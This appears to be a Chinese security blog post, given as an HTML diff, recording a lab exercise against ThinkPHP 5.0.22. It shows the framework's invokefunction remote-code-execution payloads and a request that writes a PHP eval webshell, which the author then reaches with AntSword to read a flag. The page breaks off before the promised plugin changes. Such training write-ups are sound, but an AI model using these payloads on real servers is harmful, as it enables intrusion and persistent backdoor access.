@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"twe1v3.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一次魔改蚁剑bypass_disable_functions插件的打靶记录  一、解题过程  ①：尝试通用payload url：http:&#x2F;&#x2F;1.117.101.154:30080&#x2F; 源码：http:&#x2F;&#x2F;1.117.101.154:30080&#x2F;thinkphp_5.0.22_with_extend.zip 已知： 读phpinfo()： tk5.x通用payload： ?s&#x3D;Index&#x2F;\th">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次魔改蚁剑bypass_disable_functions插件的打靶记录">
+<meta property="og:url" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="TWe1v3">
+<meta property="og:description" content="一次魔改蚁剑bypass_disable_functions插件的打靶记录  一、解题过程  ①：尝试通用payload url：http:&#x2F;&#x2F;1.117.101.154:30080&#x2F; 源码：http:&#x2F;&#x2F;1.117.101.154:30080&#x2F;thinkphp_5.0.22_with_extend.zip 已知： 读phpinfo()： tk5.x通用payload： ?s&#x3D;Index&#x2F;\th">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182714323.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182820721.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201016733.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201538864.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201659989.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201911477.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034136826.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034224434.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103202436181.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103204922812.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205100914.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205214990.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107025022272.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030223250.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030300501.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030346773.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030529707.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033415836.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033340312.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033445350.png">
+<meta property="og:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033803884.png">
+<meta property="article:published_time" content="2023-11-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-11-06T19:50:03.804Z">
+<meta property="article:author" content="TWe1v3">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182714323.png">
+
+
+<link rel="canonical" href="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/","path":"2023/11/一次魔改蚁剑bypass-disable-functions插件的打靶记录/","title":"一次魔改蚁剑bypass_disable_functions插件的打靶记录"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>一次魔改蚁剑bypass_disable_functions插件的打靶记录 | TWe1v3</title>
+  
+
+
+
+
+
+<script src="/lib/fireworks.js"></script>
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TWe1v3</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>文章标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>文章分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>时间轴</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于TWe1v3</a></li><li class="menu-item menu-item-friendlink"><a href="/friendlink/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass_disable_functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text"> 一次魔改蚁剑bypass_disable_functions插件的打靶记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">1.1.</span> <span class="nav-text"> 一、解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E5%B0%9D%E8%AF%95%E9%80%9A%E7%94%A8payload"><span class="nav-number">1.1.1.</span> <span class="nav-text"> ①：尝试通用payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E9%AD%94%E6%94%B9%E7%BB%86%E8%8A%82%E8%AF%B7%E5%BE%80%E5%90%8E%E7%9C%8B"><span class="nav-number">1.1.2.</span> <span class="nav-text"> ②：魔改细节请往后看</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E9%AD%94%E6%94%B9%E6%8F%92%E4%BB%B6%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text"> 二、魔改插件过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E8%A2%ABban%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E7%A1%AE%E8%AE%A4exp"><span class="nav-number">1.2.1.</span> <span class="nav-text"> ①：被ban函数的位置以及确认exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E7%A1%AE%E8%AE%A4%E5%87%BD%E6%95%B0%E5%8A%9F%E8%83%BD%E5%B9%B6%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.2.2.</span> <span class="nav-text"> ②：确认函数功能并手动实现</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="TWe1v3"
+      src="/images/twe1v3.jpg">
+  <p class="site-author-name" itemprop="name">TWe1v3</p>
+  <div class="site-description" itemprop="description">TWe1v3的博客</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/TWe1v3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TWe1v3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:twe1v3@qq.com" title="E-Mail → mailto:twe1v3@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://twe1v3.github.io/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/twe1v3.jpg">
+      <meta itemprop="name" content="TWe1v3">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TWe1v3">
+      <meta itemprop="description" content="TWe1v3的博客">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="一次魔改蚁剑bypass_disable_functions插件的打靶记录 | TWe1v3">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一次魔改蚁剑bypass_disable_functions插件的打靶记录
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-11-03 00:00:00" itemprop="dateCreated datePublished" datetime="2023-11-03T00:00:00+08:00">2023-11-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-07 03:50:03" itemprop="dateModified" datetime="2023-11-07T03:50:03+08:00">2023-11-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">渗透学习</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="一次魔改蚁剑bypass_disable_functions插件的打靶记录"><a class="markdownIt-Anchor" href="#一次魔改蚁剑bypass_disable_functions插件的打靶记录"></a> 一次魔改蚁剑bypass_disable_functions插件的打靶记录</h1>
+<h2 id="一-解题过程"><a class="markdownIt-Anchor" href="#一-解题过程"></a> 一、解题过程</h2>
+<h3 id="1尝试通用payload"><a class="markdownIt-Anchor" href="#1尝试通用payload"></a> ①：尝试通用payload</h3>
+<p>url：<a target="_blank" rel="noopener" href="http://1.117.101.154:30080/">http://1.117.101.154:30080/</a></p>
+<p>源码：<a target="_blank" rel="noopener" href="http://1.117.101.154:30080/thinkphp_5.0.22_with_extend.zip">http://1.117.101.154:30080/thinkphp_5.0.22_with_extend.zip</a></p>
+<p>已知：<img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182714323.png" alt="image-20231103182714323"></p>
+<p>读phpinfo()：</p>
+<p>tk5.x通用payload：</p>
+<p><code>?s=Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182820721.png" alt="image-20231103182820721"></p>
+<p>得到<strong>disable_functions</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl,gc_collect_cycles,iconv,str_repeat,str_shuffle</span><br></pre></td></tr></table></figure>
+<p>可利用命令执行函数(均被ban掉）：</p>
+<blockquote>
+<p>exec()   x<br>
+shell_exec()   x<br>
+反引号`   x<br>
+passthru()   x<br>
+popen()   x<br>
+proc_open()   x<br>
+pcntl_exec() ：需要开启pcntl扩展    x<br>
+COM组件：Wscript.Shell和Shell.Application  x<br>
+dl()：通过加载自定义php扩展突破 disable_fucnitons指令的限制   x</p>
+<p>利用PHP内核变量绕过disable_functions   x</p>
+</blockquote>
+<p>文件包含通用payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.117.101.154:30080/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=/tmp/tw.php&amp;vars[1][]=%3C%3Fphp%20echo(%22hello%20hacker%22)%3B%40eval(%24_POST%5B&#x27;tw&#x27;%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure>
+<p>这一次包含能够返回你写入的字符串长度</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201016733.png" alt="image-20231103201016733"></p>
+<p>包含之后再次使用包含来读取上一次包含返回的内容</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.117.101.154:30080/?s=Index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=think\__include_file&amp;vars[1][]=/tmp/tw.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201538864.png" alt="image-20231103201538864"></p>
+<p>访问包含的webshell一句话木马，发现能够被解析，掏出antsword直接连</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201659989.png" alt="image-20231103201659989"></p>
+<p>直接跳到根目录查看flag.flag文件</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201911477.png" alt="image-20231103201911477"></p>
+<p><mark>flag:  flag{FS_ROOT_49mAIg5AbsqbC7nP}</mark></p>
+<p>正当我长舒一口气的时候看到一个getrceflag的可进行文件：</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034136826.png" alt="image-20231107034136826"></p>
+<p>进入终端执行看看：</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034224434.png" alt="image-20231107034224434"></p>
+<p>发现限制了根目录，这时候又看到了还有一个 hint：</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103202436181.png" alt="image-20231103202436181"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜你成功RCE！</span><br><span class="line">现在你需要<span class="keyword">Bypass </span><span class="keyword">disable_function。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">本环境可使用某种现成的<span class="keyword">bypass </span>PoC，但是由于<span class="keyword">ban了某些函数，因此你需要自行对该PoC进行一些你力所能及的修改。</span></span><br><span class="line"><span class="keyword"></span>至于是哪种PoC，嘿嘿？</span><br></pre></td></tr></table></figure>
+<p>直接使用蚁剑bypass disable_functions插件，这里就需要魔改一下因为被ban的函数太多了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,<span class="built_in">exec</span>,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl,gc_collect_cycles,iconv,str_repeat,str_shuffle</span><br></pre></td></tr></table></figure>
+<h3 id="2魔改细节请往后看"><a class="markdownIt-Anchor" href="#2魔改细节请往后看"></a> ②：魔改细节请往后看</h3>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103204922812.png" alt="image-20231103204922812"></p>
